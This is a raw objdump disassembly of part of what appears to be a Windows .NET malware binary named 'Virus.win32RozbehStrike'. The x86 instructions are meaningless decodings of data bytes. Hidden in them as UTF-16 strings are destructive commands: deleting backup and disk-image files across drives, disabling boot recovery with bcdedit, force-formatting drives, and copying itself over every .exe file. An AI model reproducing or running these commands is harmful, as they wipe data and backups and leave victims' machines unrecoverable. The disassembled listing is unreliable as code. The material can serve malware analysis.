  4052ef:	61                   	popa
  4052f0:	00 63 00             	add    %ah,0x0(%ebx)
  4052f3:	20 00                	and    %al,(%eax)
  4052f5:	6b 00 3a             	imul   $0x3a,(%eax),%eax
  4052f8:	00 5c 00 2a          	add    %bl,0x2a(%eax,%eax,1)
  4052fc:	00 2e                	add    %ch,(%esi)
  4052fe:	00 62 00             	add    %ah,0x0(%edx)
  405301:	61                   	popa
  405302:	00 6b 00             	add    %ch,0x0(%ebx)
  405305:	20 00                	and    %al,(%eax)
  405307:	6b 00 3a             	imul   $0x3a,(%eax),%eax
  40530a:	00 5c 00 2a          	add    %bl,0x2a(%eax,%eax,1)
  40530e:	00 2e                	add    %ch,(%esi)
  405310:	00 77 00             	add    %dh,0x0(%edi)
  405313:	62 00                	bound  %eax,(%eax)
  405315:	63 00                	arpl   %eax,(%eax)
  405317:	61                   	popa
  405318:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
  40531c:	00 6b 00             	add    %ch,0x0(%ebx)
  40531f:	3a 00                	cmp    (%eax),%al
  405321:	5c                   	pop    %esp
  405322:	00 2a                	add    %ch,(%edx)
  405324:	00 2e                	add    %ch,(%esi)
  405326:	00 62 00             	add    %ah,0x0(%edx)
  405329:	6b 00 66             	imul   $0x66,(%eax),%eax
  40532c:	00 20                	add    %ah,(%eax)
  40532e:	00 6b 00             	add    %ch,0x0(%ebx)
  405331:	3a 00                	cmp    (%eax),%al
  405333:	5c                   	pop    %esp
  405334:	00 42 00             	add    %al,0x0(%edx)
  405337:	61                   	popa
  405338:	00 63 00             	add    %ah,0x0(%ebx)
  40533b:	6b 00 75             	imul   $0x75,(%eax),%eax
  40533e:	00 70 00             	add    %dh,0x0(%eax)
  405341:	2a 00                	sub    (%eax),%al
  405343:	2e 00 2a             	add    %ch,%cs:(%edx)
  405346:	00 20                	add    %ah,(%eax)
  405348:	00 6b 00             	add    %ch,0x0(%ebx)
  40534b:	3a 00                	cmp    (%eax),%al
  40534d:	5c                   	pop    %esp
  40534e:	00 62 00             	add    %ah,0x0(%edx)
  405351:	61                   	popa
  405352:	00 63 00             	add    %ah,0x0(%ebx)
  405355:	6b 00 75             	imul   $0x75,(%eax),%eax
  405358:	00 70 00             	add    %dh,0x0(%eax)
  40535b:	2a 00                	sub    (%eax),%al
  40535d:	2e 00 2a             	add    %ch,%cs:(%edx)
  405360:	00 20                	add    %ah,(%eax)
  405362:	00 6b 00             	add    %ch,0x0(%ebx)
  405365:	3a 00                	cmp    (%eax),%al
  405367:	5c                   	pop    %esp
  405368:	00 2a                	add    %ch,(%edx)
  40536a:	00 2e                	add    %ch,(%esi)
  40536c:	00 73 00             	add    %dh,0x0(%ebx)
  40536f:	65 00 74 00 20       	add    %dh,%gs:0x20(%eax,%eax,1)
  405374:	00 6b 00             	add    %ch,0x0(%ebx)
  405377:	3a 00                	cmp    (%eax),%al
  405379:	5c                   	pop    %esp
  40537a:	00 2a                	add    %ch,(%edx)
  40537c:	00 2e                	add    %ch,(%esi)
  40537e:	00 77 00             	add    %dh,0x0(%edi)
  405381:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  405387:	6b 00 3a             	imul   $0x3a,(%eax),%eax
  40538a:	00 5c 00 2a          	add    %bl,0x2a(%eax,%eax,1)
  40538e:	00 2e                	add    %ch,(%esi)
  405390:	00 64 00 73          	add    %ah,0x73(%eax,%eax,1)
  405394:	00 6b 00             	add    %ch,0x0(%ebx)
  405397:	00 81 17 20 00 20    	add    %al,0x20002017(%ecx)
  40539d:	00 20                	add    %ah,(%eax)
  40539f:	00 20                	add    %ah,(%eax)
  4053a1:	00 20                	add    %ah,(%eax)
  4053a3:	00 20                	add    %ah,(%eax)
  4053a5:	00 20                	add    %ah,(%eax)
  4053a7:	00 20                	add    %ah,(%eax)
  4053a9:	00 20                	add    %ah,(%eax)
  4053ab:	00 20                	add    %ah,(%eax)
  4053ad:	00 20                	add    %ah,(%eax)
  4053af:	00 20                	add    %ah,(%eax)
  4053b1:	00 20                	add    %ah,(%eax)
  4053b3:	00 20                	add    %ah,(%eax)
  4053b5:	00 20                	add    %ah,(%eax)
  4053b7:	00 20                	add    %ah,(%eax)
  4053b9:	00 20                	add    %ah,(%eax)
  4053bb:	00 20                	add    %ah,(%eax)
  4053bd:	00 20                	add    %ah,(%eax)
  4053bf:	00 20                	add    %ah,(%eax)
  4053c1:	00 20                	add    %ah,(%eax)
  4053c3:	00 20                	add    %ah,(%eax)
  4053c5:	00 20                	add    %ah,(%eax)
  4053c7:	00 20                	add    %ah,(%eax)
  4053c9:	00 20                	add    %ah,(%eax)
  4053cb:	00 20                	add    %ah,(%eax)
  4053cd:	00 20                	add    %ah,(%eax)
  4053cf:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  4053d3:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  4053d7:	00 2f                	add    %ch,(%edi)
  4053d9:	00 73 00             	add    %dh,0x0(%ebx)
  4053dc:	20 00                	and    %al,(%eax)
  4053de:	2f                   	das
  4053df:	00 66 00             	add    %ah,0x0(%esi)
  4053e2:	20 00                	and    %al,(%eax)
  4053e4:	2f                   	das
  4053e5:	00 71 00             	add    %dh,0x0(%ecx)
  4053e8:	20 00                	and    %al,(%eax)
  4053ea:	6c                   	insb   (%dx),%es:(%edi)
  4053eb:	00 3a                	add    %bh,(%edx)
  4053ed:	00 5c 00 2a          	add    %bl,0x2a(%eax,%eax,1)
  4053f1:	00 2e                	add    %ch,(%esi)
  4053f3:	00 56 00             	add    %dl,0x0(%esi)
  4053f6:	48                   	dec    %eax
  4053f7:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  4053fb:	00 6c 00 3a          	add    %ch,0x3a(%eax,%eax,1)
  4053ff:	00 5c 00 2a          	add    %bl,0x2a(%eax,%eax,1)
  405403:	00 2e                	add    %ch,(%esi)
  405405:	00 62 00             	add    %ah,0x0(%edx)
  405408:	61                   	popa
  405409:	00 63 00             	add    %ah,0x0(%ebx)
  40540c:	20 00                	and    %al,(%eax)
  40540e:	6c                   	insb   (%dx),%es:(%edi)
  40540f:	00 3a                	add    %bh,(%edx)
  405411:	00 5c 00 2a          	add    %bl,0x2a(%eax,%eax,1)
  405415:	00 2e                	add    %ch,(%esi)
  405417:	00 62 00             	add    %ah,0x0(%edx)
  40541a:	61                   	popa
  40541b:	00 6b 00             	add    %ch,0x0(%ebx)
  40541e:	20 00                	and    %al,(%eax)
  405420:	6c                   	insb   (%dx),%es:(%edi)
  405421:	00 3a                	add    %bh,(%edx)
  405423:	00 5c 00 2a          	add    %bl,0x2a(%eax,%eax,1)
  405427:	00 2e                	add    %ch,(%esi)
  405429:	00 77 00             	add    %dh,0x0(%edi)
  40542c:	62 00                	bound  %eax,(%eax)
  40542e:	63 00                	arpl   %eax,(%eax)
  405430:	61                   	popa
  405431:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
  405435:	00 6c 00 3a          	add    %ch,0x3a(%eax,%eax,1)
  405439:	00 5c 00 2a          	add    %bl,0x2a(%eax,%eax,1)
  40543d:	00 2e                	add    %ch,(%esi)
  40543f:	00 62 00             	add    %ah,0x0(%edx)
  405442:	6b 00 66             	imul   $0x66,(%eax),%eax
  405445:	00 20                	add    %ah,(%eax)
  405447:	00 6c 00 3a          	add    %ch,0x3a(%eax,%eax,1)
  40544b:	00 5c 00 42          	add    %bl,0x42(%eax,%eax,1)
  40544f:	00 61 00             	add    %ah,0x0(%ecx)
  405452:	63 00                	arpl   %eax,(%eax)
  405454:	6b 00 75             	imul   $0x75,(%eax),%eax
  405457:	00 70 00             	add    %dh,0x0(%eax)
  40545a:	2a 00                	sub    (%eax),%al
  40545c:	2e 00 2a             	add    %ch,%cs:(%edx)
  40545f:	00 20                	add    %ah,(%eax)
  405461:	00 6c 00 3a          	add    %ch,0x3a(%eax,%eax,1)
  405465:	00 5c 00 62          	add    %bl,0x62(%eax,%eax,1)
  405469:	00 61 00             	add    %ah,0x0(%ecx)
  40546c:	63 00                	arpl   %eax,(%eax)
  40546e:	6b 00 75             	imul   $0x75,(%eax),%eax
  405471:	00 70 00             	add    %dh,0x0(%eax)
  405474:	2a 00                	sub    (%eax),%al
  405476:	2e 00 2a             	add    %ch,%cs:(%edx)
  405479:	00 20                	add    %ah,(%eax)
  40547b:	00 6c 00 3a          	add    %ch,0x3a(%eax,%eax,1)
  40547f:	00 5c 00 2a          	add    %bl,0x2a(%eax,%eax,1)
  405483:	00 2e                	add    %ch,(%esi)
  405485:	00 73 00             	add    %dh,0x0(%ebx)
  405488:	65 00 74 00 20       	add    %dh,%gs:0x20(%eax,%eax,1)
  40548d:	00 6c 00 3a          	add    %ch,0x3a(%eax,%eax,1)
  405491:	00 5c 00 2a          	add    %bl,0x2a(%eax,%eax,1)
  405495:	00 2e                	add    %ch,(%esi)
  405497:	00 77 00             	add    %dh,0x0(%edi)
  40549a:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  4054a0:	6c                   	insb   (%dx),%es:(%edi)
  4054a1:	00 3a                	add    %bh,(%edx)
  4054a3:	00 5c 00 2a          	add    %bl,0x2a(%eax,%eax,1)
  4054a7:	00 2e                	add    %ch,(%esi)
  4054a9:	00 64 00 73          	add    %ah,0x73(%eax,%eax,1)
  4054ad:	00 6b 00             	add    %ch,0x0(%ebx)
  4054b0:	00 55 20             	add    %dl,0x20(%ebp)
  4054b3:	00 62 00             	add    %ah,0x0(%edx)
  4054b6:	63 00                	arpl   %eax,(%eax)
  4054b8:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  4054bc:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  4054c0:	74 00                	je     0x4054c2
  4054c2:	20 00                	and    %al,(%eax)
  4054c4:	2f                   	das
  4054c5:	00 73 00             	add    %dh,0x0(%ebx)
  4054c8:	65 00 74 00 20       	add    %dh,%gs:0x20(%eax,%eax,1)
  4054cd:	00 7b 00             	add    %bh,0x0(%ebx)
  4054d0:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  4054d4:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  4054d8:	75 00                	jne    0x4054da
  4054da:	6c                   	insb   (%dx),%es:(%edi)
  4054db:	00 74 00 7d          	add    %dh,0x7d(%eax,%eax,1)
  4054df:	00 20                	add    %ah,(%eax)
  4054e1:	00 72 00             	add    %dh,0x0(%edx)
  4054e4:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4054e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4054e9:	00 76 00             	add    %dh,0x0(%esi)
  4054ec:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4054f0:	79 00                	jns    0x4054f2
  4054f2:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4054f6:	61                   	popa
  4054f7:	00 62 00             	add    %ah,0x0(%edx)
  4054fa:	6c                   	insb   (%dx),%es:(%edi)
  4054fb:	00 65 00             	add    %ah,0x0(%ebp)
  4054fe:	64 00 20             	add    %ah,%fs:(%eax)
  405501:	00 4e 00             	add    %cl,0x0(%esi)
  405504:	6f                   	outsl  %ds:(%esi),(%dx)
  405505:	00 00                	add    %al,(%eax)
  405507:	73 20                	jae    0x405529
  405509:	00 62 00             	add    %ah,0x0(%edx)
  40550c:	63 00                	arpl   %eax,(%eax)
  40550e:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  405512:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  405516:	74 00                	je     0x405518
  405518:	20 00                	and    %al,(%eax)
  40551a:	2f                   	das
  40551b:	00 73 00             	add    %dh,0x0(%ebx)
  40551e:	65 00 74 00 20       	add    %dh,%gs:0x20(%eax,%eax,1)
  405523:	00 7b 00             	add    %bh,0x0(%ebx)
  405526:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40552a:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40552e:	75 00                	jne    0x405530
  405530:	6c                   	insb   (%dx),%es:(%edi)
  405531:	00 74 00 7d          	add    %dh,0x7d(%eax,%eax,1)
  405535:	00 20                	add    %ah,(%eax)
  405537:	00 62 00             	add    %ah,0x0(%edx)
  40553a:	6f                   	outsl  %ds:(%esi),(%dx)
  40553b:	00 6f 00             	add    %ch,0x0(%edi)
  40553e:	74 00                	je     0x405540
  405540:	73 00                	jae    0x405542
  405542:	74 00                	je     0x405544
  405544:	61                   	popa
  405545:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  405549:	00 73 00             	add    %dh,0x0(%ebx)
  40554c:	70 00                	jo     0x40554e
  40554e:	6f                   	outsl  %ds:(%esi),(%dx)
  40554f:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  405553:	00 63 00             	add    %ah,0x0(%ebx)
  405556:	79 00                	jns    0x405558
  405558:	20 00                	and    %al,(%eax)
  40555a:	69 00 67 00 6e 00    	imul   $0x6e0067,(%eax),%eax
  405560:	6f                   	outsl  %ds:(%esi),(%dx)
  405561:	00 72 00             	add    %dh,0x0(%edx)
  405564:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  405568:	6c                   	insb   (%dx),%es:(%edi)
  405569:	00 6c 00 66          	add    %ch,0x66(%eax,%eax,1)
  40556d:	00 61 00             	add    %ah,0x0(%ecx)
  405570:	69 00 6c 00 75 00    	imul   $0x75006c,(%eax),%eax
  405576:	72 00                	jb     0x405578
  405578:	65 00 00             	add    %al,%gs:(%eax)
  40557b:	0b 2a                	or     (%edx),%ebp
  40557d:	00 2e                	add    %ch,(%esi)
  40557f:	00 65 00             	add    %ah,0x0(%ebp)
  405582:	78 00                	js     0x405584
  405584:	65 00 00             	add    %al,%gs:(%eax)
  405587:	0b 2a                	or     (%edx),%ebp
  405589:	00 2e                	add    %ch,(%esi)
  40558b:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40558f:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  405593:	0b 2a                	or     (%edx),%ebp
  405595:	00 2e                	add    %ch,(%esi)
  405597:	00 73 00             	add    %dh,0x0(%ebx)
  40559a:	79 00                	jns    0x40559c
  40559c:	73 00                	jae    0x40559e
  40559e:	00 0b                	add    %cl,(%ebx)
  4055a0:	2a 00                	sub    (%eax),%al
  4055a2:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  4055a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4055a7:	00 6d 00             	add    %ch,0x0(%ebp)
  4055aa:	00 0f                	add    %cl,(%edi)
  4055ac:	63 00                	arpl   %eax,(%eax)
  4055ae:	6d                   	insl   (%dx),%es:(%edi)
  4055af:	00 64 00 2e          	add    %ah,0x2e(%eax,%eax,1)
  4055b3:	00 65 00             	add    %ah,0x0(%ebp)
  4055b6:	78 00                	js     0x4055b8
  4055b8:	65 00 00             	add    %al,%gs:(%eax)
  4055bb:	07                   	pop    %es
  4055bc:	2f                   	das
  4055bd:	00 43 00             	add    %al,0x0(%ebx)
  4055c0:	20 00                	and    %al,(%eax)
  4055c2:	00 0f                	add    %cl,(%edi)
  4055c4:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  4055c8:	72 00                	jb     0x4055ca
  4055ca:	6d                   	insl   (%dx),%es:(%edi)
  4055cb:	00 61 00             	add    %ah,0x0(%ecx)
  4055ce:	74 00                	je     0x4055d0
  4055d0:	20 00                	and    %al,(%eax)
  4055d2:	00 25 20 00 2f 00    	add    %ah,0x2f0020
  4055d8:	46                   	inc    %esi
  4055d9:	00 53 00             	add    %dl,0x0(%ebx)
  4055dc:	3a 00                	cmp    (%eax),%al
  4055de:	4e                   	dec    %esi
  4055df:	00 54 00 46          	add    %dl,0x46(%eax,%eax,1)
  4055e3:	00 53 00             	add    %dl,0x0(%ebx)
  4055e6:	20 00                	and    %al,(%eax)
  4055e8:	2f                   	das
  4055e9:	00 58 00             	add    %bl,0x0(%eax)
  4055ec:	20 00                	and    %al,(%eax)
  4055ee:	2f                   	das
  4055ef:	00 51 00             	add    %dl,0x0(%ecx)
  4055f2:	20 00                	and    %al,(%eax)
  4055f4:	2f                   	das
  4055f5:	00 79 00             	add    %bh,0x0(%ecx)
  4055f8:	00 55 66             	add    %dl,0x66(%ebp)
  4055fb:	00 6f 00             	add    %ch,0x0(%edi)
  4055fe:	72 00                	jb     0x405600
  405600:	20 00                	and    %al,(%eax)
  405602:	2f                   	das
  405603:	00 66 00             	add    %ah,0x0(%esi)
  405606:	20 00                	and    %al,(%eax)
  405608:	25 00 25 00 66       	and    $0x66002500,%eax
  40560d:	00 20                	add    %ah,(%eax)
  40560f:	00 69 00             	add    %ch,0x0(%ecx)
  405612:	6e                   	outsb  %ds:(%esi),(%dx)
  405613:	00 20                	add    %ah,(%eax)
  405615:	00 28                	add    %ch,(%eax)
  405617:	00 27                	add    %ah,(%edi)
  405619:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  40561d:	00 72 00             	add    %dh,0x0(%edx)
  405620:	20 00                	and    %al,(%eax)
  405622:	2a 00                	sub    (%eax),%al
  405624:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  405628:	78 00                	js     0x40562a
  40562a:	65 00 20             	add    %ah,%gs:(%eax)
  40562d:	00 2f                	add    %ch,(%edi)
  40562f:	00 73 00             	add    %dh,0x0(%ebx)
  405632:	20 00                	and    %al,(%eax)
  405634:	2f                   	das
  405635:	00 62 00             	add    %ah,0x0(%edx)
  405638:	27                   	daa
  405639:	00 29                	add    %ch,(%ecx)
  40563b:	00 20                	add    %ah,(%eax)
  40563d:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  405641:	00 20                	add    %ah,(%eax)
  405643:	00 63 00             	add    %ah,0x0(%ebx)
  405646:	6f                   	outsl  %ds:(%esi),(%dx)
  405647:	00 70 00             	add    %dh,0x0(%eax)
  40564a:	79 00                	jns    0x40564c
  40564c:	20 00                	and    %al,(%eax)
  40564e:	01 09                	add    %ecx,(%ecx)
  405650:	20 00                	and    %al,(%eax)
  405652:	25 00 25 00 66       	and    $0x66002500,%eax
  405657:	00 00                	add    %al,(%eax)
  405659:	2f                   	das
  40565a:	56                   	push   %esi
  40565b:	00 69 00             	add    %ch,0x0(%ecx)
  40565e:	72 00                	jb     0x405660
  405660:	75 00                	jne    0x405662
  405662:	73 00                	jae    0x405664
  405664:	2e 00 77 00          	add    %dh,%cs:0x0(%edi)
  405668:	69 00 6e 00 33 00    	imul   $0x33006e,(%eax),%eax
  40566e:	32 00                	xor    (%eax),%al
  405670:	52                   	push   %edx
  405671:	00 6f 00             	add    %ch,0x0(%edi)
  405674:	7a 00                	jp     0x405676
  405676:	62 00                	bound  %eax,(%eax)
  405678:	65 00 68 00          	add    %ch,%gs:0x0(%eax)
  40567c:	53                   	push   %ebx
  40567d:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  405681:	00 69 00             	add    %ch,0x0(%ecx)
  405684:	6b 00 65             	imul   $0x65,(%eax),%eax
  405687:	00 00                	add    %al,(%eax)
  405689:	11 4d 00             	adc    %ecx,0x0(%ebp)
  40568c:	61                   	popa
  40568d:	00 69 00             	add    %ch,0x0(%ecx)
  405690:	6e                   	outsb  %ds:(%esi),(%dx)
  405691:	00 46 00             	add    %al,0x0(%esi)
  405694:	6f                   	outsl  %ds:(%esi),(%dx)
  405695:	00 72 00             	add    %dh,0x0(%edx)
  405698:	6d                   	insl   (%dx),%es:(%edi)
  405699:	00 00                	add    %al,(%eax)
  40569b:	00 89 92 41 d1 f8    	add    %cl,-0x72ebe6e(%ecx)
  4056a1:	d5 7b                	aad    $0x7b
  4056a3:	4e                   	dec    %esi
  4056a4:	8f                   	(bad)
  4056a5:	31 c3                	xor    %eax,%ebx
  4056a7:	71 07                	jno    0x4056b0
  4056a9:	f7 31                	divl   (%ecx)
  4056ab:	18 00                	sbb    %al,(%eax)
  4056ad:	08 b7 7a 5c 56 19    	or     %dh,0x19565c7a(%edi)
  4056b3:	34 e0                	xor    $0xe0,%al
  4056b5:	89 03                	mov    %eax,(%ebx)
  4056b7:	06                   	push   %es
  4056b8:	1d 05 06 00 03       	sbb    $0x3000605,%eax
  4056bd:	01 09                	add    %ecx,(%ecx)
  4056bf:	09 09                	or     %ecx,(%ecx)
  4056c1:	03 20                	add    (%eax),%esp
  4056c3:	00 01                	add    %al,(%ecx)
  4056c5:	04 20                	add    $0x20,%al
  4056c7:	01 01                	add    %eax,(%ecx)
  4056c9:	0e                   	push   %cs
  4056ca:	04 00                	add    $0x0,%al
  4056cc:	01 01                	add    %eax,(%ecx)
  4056ce:	0e                   	push   %cs
  4056cf:	03 06                	add    (%esi),%eax
  4056d1:	12 0d 04 20 01 01    	adc    0x1012004,%cl
  4056d7:	02 05 00 01 01 1d    	add    0x1d010100,%al
  4056dd:	0e                   	push   %cs
  4056de:	05 20 01 01 11       	add    $0x11010120,%eax
  4056e3:	41                   	inc    %ecx
  4056e4:	04 20                	add    $0x20,%al
  4056e6:	01 01                	add    %eax,(%ecx)
  4056e8:	08 03                	or     %al,(%ebx)
  4056ea:	00 00                	add    %al,(%eax)
  4056ec:	0e                   	push   %cs
  4056ed:	05 00 01 1d 05       	add    $0x51d0100,%eax
  4056f2:	0e                   	push   %cs
  4056f3:	03 06                	add    (%esi),%eax
  4056f5:	12 5d 06             	adc    0x6(%ebp),%bl
  4056f8:	20 02                	and    %al,(%edx)
  4056fa:	12 5d 0e             	adc    0xe(%ebp),%bl
  4056fd:	02 06                	add    (%esi),%al
  4056ff:	00 03                	add    %al,(%ebx)
  405701:	0e                   	push   %cs
  405702:	0e                   	push   %cs
  405703:	0e                   	push   %cs
  405704:	0e                   	push   %cs
  405705:	05 20 02 01 0e       	add    $0xe010220,%eax
  40570a:	1c 05                	sbb    $0x5,%al
  40570c:	20 01                	and    %al,(%ecx)
  40570e:	12 5d 0e             	adc    0xe(%ebp),%bl
  405711:	07                   	pop    %es
  405712:	20 03                	and    %al,(%ebx)
  405714:	01 0e                	add    %ecx,(%esi)
  405716:	1c 11                	sbb    $0x11,%al
  405718:	69 05 00 01 0e 11 71 	imul   $0x1000571,0x110e0100,%eax
  40571f:	05 00 01 
  405722:	1d 0e 0e 04 00       	sbb    $0x40e0e,%eax
  405727:	01 0e                	add    %ecx,(%esi)
  405729:	0e                   	push   %cs
  40572a:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40572f:	0e                   	push   %cs
  405730:	05 00 02 01 0e       	add    $0xe010200,%eax
  405735:	0e                   	push   %cs
  405736:	05 20 00 12 80       	add    $0x80120020,%eax
  40573b:	81 05 20 02 01 0e 0e 	addl   $0x60e,0xe010220
  405742:	06 00 00 
  405745:	1d 12 80 89 03       	sbb    $0x3898012,%eax
  40574a:	20 00                	and    %al,(%eax)
  40574c:	0e                   	push   %cs
  40574d:	03 00                	add    (%eax),%eax
  40574f:	00 01                	add    %al,(%ecx)
  405751:	02 06                	add    (%esi),%al
  405753:	0e                   	push   %cs
  405754:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  405759:	05 05 00 02 01       	add    $0x1020005,%eax
  40575e:	0e                   	push   %cs
  40575f:	1c 3a                	sbb    $0x3a,%al
  405761:	07                   	pop    %es
  405762:	2b 12                	sub    (%edx),%edx
  405764:	5d                   	pop    %ebp
  405765:	12 5d 0e             	adc    0xe(%ebp),%bl
  405768:	0e                   	push   %cs
  405769:	0e                   	push   %cs
  40576a:	0e                   	push   %cs
  40576b:	0e                   	push   %cs
  40576c:	0e                   	push   %cs
  40576d:	0e                   	push   %cs
  40576e:	0e                   	push   %cs
  40576f:	0e                   	push   %cs
  405770:	0e                   	push   %cs
  405771:	0e                   	push   %cs
  405772:	0e                   	push   %cs
  405773:	0e                   	push   %cs
  405774:	0e                   	push   %cs
  405775:	0e                   	push   %cs
  405776:	0e                   	push   %cs
  405777:	0e                   	push   %cs
  405778:	0e                   	push   %cs
  405779:	0e                   	push   %cs
  40577a:	0e                   	push   %cs
  40577b:	0e                   	push   %cs
  40577c:	1d 0e 1d 0e 0e       	sbb    $0xe0e1d0e,%eax
  405781:	0e                   	push   %cs
  405782:	0e                   	push   %cs
  405783:	0e                   	push   %cs
  405784:	0e                   	push   %cs
  405785:	0e                   	push   %cs
  405786:	1d 0e 08 0e 0e       	sbb    $0xe0e080e,%eax
  40578b:	12 7d 12             	adc    0x12(%ebp),%bh
  40578e:	80 89 1d 05 0e 02 1d 	orb    $0x1d,0x20e051d(%ecx)
  405795:	0e                   	push   %cs
  405796:	08 1d 12 80 89 09    	or     %bl,0x9898012
  40579c:	00 03                	add    %al,(%ebx)
  40579e:	1d 0e 0e 0e 11       	sbb    $0x110e0e0e,%eax
  4057a3:	80 a1 06 00 02 01 0e 	andb   $0xe,0x1020006(%ecx)
  4057aa:	1d 05 0c 07 06       	sbb    $0x6070c05,%eax
  4057af:	1d 0e 1d 0e 1d       	sbb    $0x1d0e1d0e,%eax
  4057b4:	0e                   	push   %cs
  4057b5:	1d 0e 08 02 09       	sbb    $0x902080e,%eax
  4057ba:	07                   	pop    %es
  4057bb:	05 0e 1d 0e 1d       	add    $0x1d0e1d0e,%eax
  4057c0:	0e                   	push   %cs
  4057c1:	08 02                	or     %al,(%edx)
  4057c3:	06                   	push   %es
  4057c4:	20 01                	and    %al,(%ecx)
  4057c6:	01 11                	add    %edx,(%ecx)
  4057c8:	80 a9 06 20 01 01 12 	subb   $0x12,0x1012006(%ecx)
  4057cf:	80 a5 03 20 00 02 08 	andb   $0x8,0x2002003(%ebp)
  4057d6:	07                   	pop    %es
  4057d7:	02 12                	add    (%edx),%dl
  4057d9:	80 91 12 80 a5 03 07 	adcb   $0x7,0x3a58012(%ecx)
  4057e0:	01 0e                	add    %ecx,(%esi)
  4057e2:	03 07                	add    (%edi),%eax
  4057e4:	01 02                	add    %eax,(%edx)
  4057e6:	06                   	push   %es
  4057e7:	20 01                	and    %al,(%ecx)
  4057e9:	01 11                	add    %edx,(%ecx)
  4057eb:	80 b1 04 01 00 00 00 	xorb   $0x0,0x104(%ecx)
  4057f2:	04 00                	add    $0x0,%al
  4057f4:	01 01                	add    %eax,(%ecx)
  4057f6:	02 05 00 01 01 12    	add    0x12010100,%al
  4057fc:	05 65 01 00 29       	add    $0x29000165,%eax
  405801:	2e 4e                	cs dec %esi
  405803:	45                   	inc    %ebp
  405804:	54                   	push   %esp
  405805:	46                   	inc    %esi
  405806:	72 61                	jb     0x405869
  405808:	6d                   	insl   (%dx),%es:(%edi)
  405809:	65 77 6f             	gs ja  0x40587b
  40580c:	72 6b                	jb     0x405879
  40580e:	2c 56                	sub    $0x56,%al
  405810:	65 72 73             	gs jb  0x405886
  405813:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40581a:	30 2c 50             	xor    %ch,(%eax,%edx,2)
  40581d:	72 6f                	jb     0x40588e
  40581f:	66 69 6c 65 3d 43 6c 	imul   $0x6c43,0x3d(%ebp,%eiz,2),%bp
  405826:	69 65 6e 74 01 00 54 	imul   $0x54000174,0x6e(%ebp),%esp
  40582d:	0e                   	push   %cs
  40582e:	14 46                	adc    $0x46,%al
  405830:	72 61                	jb     0x405893
  405832:	6d                   	insl   (%dx),%es:(%edi)
  405833:	65 77 6f             	gs ja  0x4058a5
  405836:	72 6b                	jb     0x4058a3
  405838:	44                   	inc    %esp
  405839:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  405840:	61                   	popa
  405841:	6d                   	insl   (%dx),%es:(%edi)
  405842:	65 1f                	gs pop %ds
  405844:	2e 4e                	cs dec %esi
  405846:	45                   	inc    %ebp
  405847:	54                   	push   %esp
  405848:	20 46 72             	and    %al,0x72(%esi)
  40584b:	61                   	popa
  40584c:	6d                   	insl   (%dx),%es:(%edi)
  40584d:	65 77 6f             	gs ja  0x4058bf
  405850:	72 6b                	jb     0x4058bd
  405852:	20 34 20             	and    %dh,(%eax,%eiz,1)
  405855:	43                   	inc    %ebx
  405856:	6c                   	insb   (%dx),%es:(%edi)
  405857:	69 65 6e 74 20 50 72 	imul   $0x72502074,0x6e(%ebp),%esp
  40585e:	6f                   	outsl  %ds:(%esi),(%dx)
  40585f:	66 69 6c 65 1c 01 00 	imul   $0x1,0x1c(%ebp,%eiz,2),%bp
  405866:	17                   	pop    %ss
  405867:	56                   	push   %esi
  405868:	69 72 75 73 2e 77 69 	imul   $0x69772e73,0x75(%edx),%esi
  40586f:	6e                   	outsb  %ds:(%esi),(%dx)
  405870:	33 32                	xor    (%edx),%esi
  405872:	52                   	push   %edx
  405873:	6f                   	outsl  %ds:(%esi),(%dx)
  405874:	7a 62                	jp     0x4058d8
  405876:	65 68 53 74 72 69    	gs push $0x69727453
  40587c:	6b 65 00 00          	imul   $0x0,0x0(%ebp),%esp
  405880:	05 01 00 00 00       	add    $0x1,%eax
  405885:	00 13                	add    %dl,(%ebx)
  405887:	01 00                	add    %eax,(%eax)
  405889:	0e                   	push   %cs
  40588a:	43                   	inc    %ebx
  40588b:	6f                   	outsl  %ds:(%esi),(%dx)
  40588c:	70 79                	jo     0x405907
  40588e:	72 69                	jb     0x4058f9
  405890:	67 68 74 20 32 30    	addr16 push $0x30322074
  405896:	32 32                	xor    (%edx),%dh
  405898:	00 00                	add    %al,(%eax)
  40589a:	08 01                	or     %al,(%ecx)
  40589c:	00 07                	add    %al,(%edi)
  40589e:	01 00                	add    %eax,(%eax)
  4058a0:	00 00                	add    %al,(%eax)
  4058a2:	00 08                	add    %cl,(%eax)
  4058a4:	01 00                	add    %eax,(%eax)
  4058a6:	08 00                	or     %al,(%eax)
  4058a8:	00 00                	add    %al,(%eax)
  4058aa:	00 00                	add    %al,(%eax)
  4058ac:	1e                   	push   %ds
